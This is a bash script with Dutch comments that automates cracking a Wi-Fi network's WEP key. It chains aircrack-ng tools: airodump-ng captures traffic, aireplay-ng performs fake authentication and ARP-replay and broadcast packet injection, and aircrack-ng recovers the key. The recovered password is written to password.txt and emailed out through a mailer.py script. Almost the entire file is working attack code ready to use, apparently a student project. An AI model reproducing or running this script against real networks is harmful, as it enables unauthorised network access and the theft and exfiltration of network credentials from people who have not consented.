#!/bin/bash
#set -x
#####################################################################################
# Programmer : Tinne & Brecht                                                       #
#                                                                                   #
# Program : Crack Wifi WEP                                                          #
#                                                                                   #
#                                                                                   #
#  _____   _                          ____                         _       _        #
# |_   _| (_)  _ __    _ __     ___  | __ )   _ __    ___    ___  | |__   | |_      #
#   | |   | | | '_ \  | '_ \   / _ \ |  _ \  | '__|  / _ \  / __| | '_ \  | __|     #
#   | |   | | | | | | | | | | |  __/ | |_) | | |    |  __/ | (__  | | | | | |_      #
#   |_|   |_| |_| |_| |_| |_|  \___| |____/  |_|     \___|  \___| |_| |_|  \__|     #
#                                                                                   #
#####################################################################################
#export => variabelen die we verder in het script gebruiken
export IFACE
export BSSID
export CHANNEL
export SSID
export CMAC

# echo is een commentaar lijn die op het scherm komt.
# Confirm the argument enter
if [ -z $1 ]
then echo "Usage: CrackTheWifi.sh  <interface>"
echo "Please, Enter the interface to use for the crack"
echo "Example, ./CrackTheWifi.sh wlan0mon"
echo "Set interface in MONITOR mode: airmon-ng start interface."
exit
fi

#Start airodump-ng to AP information
IFACE=$1
echo "Starting listing...  Do CTRL + C when you find AP"
sleep 2
sudo airodump-ng $IFACE

# De nodige informatie wordt gevraagd.
echo "### AP INFORMATION ###"
echo "Enter BSSID: "; read BSSID
echo "Enter AP Channel: "; read CHANNEL
echo "Enter AP SSID:"; read SSID

# MAC adres wordt opgeslagen in onze variabele CMAC.
CMAC=$(ip link show $IFACE | tail -n 1 | cut -f 6 --d " ")

# Door het $dollar teken wordt de daarnet ingegeven informatie 'teruggehaald'.
echo "Starting WEP Cracking with these parameters: "
echo ""
echo " Interface: $IFACE";
echo " Channel: $CHANNEL";
echo " BSSID: $BSSID";
echo " SSID: $SSID";

# Er wordt nagegaan of er een CMAC is
if [ -z  "$CMAC" ]
then echo " No client MAC"
else
echo " Client MAC: $CMAC"
fi
echo ""

# We verwijderen alle files waar de gevangen id's inzitten.
# Op deze manier blijft de naam steeds hetzelfde en kan het geautmatiseerd worden.
rm -rf *.cap
rm -rf *.csv
rm -rf *.netxml

# xterm voor een commando => een nieuw scherm dat open gaat.
# met onderstaande commando's openen we 4 vensters/terminals.
# de '&' aan het einde van een commando => proces wordt gestart op de achtergrond.
# het 'sleep' commando zet alles op 'hold'/pauze voor het aantal seconden dat je er zelf achter zet.

# airodump-ng commando start het 'vangen' van data.
xterm -e "airodump-ng -c $CHANNEL -w '$SSID' --bssid $BSSID $IFACE" &
# Start aireplay-ng voor valse authentificatie.
xterm -e "aireplay-ng -1 0 -a $BSSID -h $CMAC -e $SSID $IFACE --ignore-negative-one" &
sleep 15
# Zend ARP verzoek => Data zou nu snel moeten toenemen.
xterm -e "aireplay-ng -3 -b $BSSID -h $CMAC  $IFACE --ignore-negative-one" &
# In dit commando sturen we de pakketten naar alle hosts op het netwerk.
xterm -e "aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b $BSSID -h $CMAC $IFACE --ignore-negative-one" &
sleep 120
# De file waar de gevangen id inzit.
# tee => Opslaan van wachtwoord in een file die we later gaan gebruiken om via mail te verzenden.
aircrack-ng -a 1 -b $BSSID -n 64 $SSID-01.cap | tee password.txt
# Zend email met gevonden wachtwoord.
python mailer.py
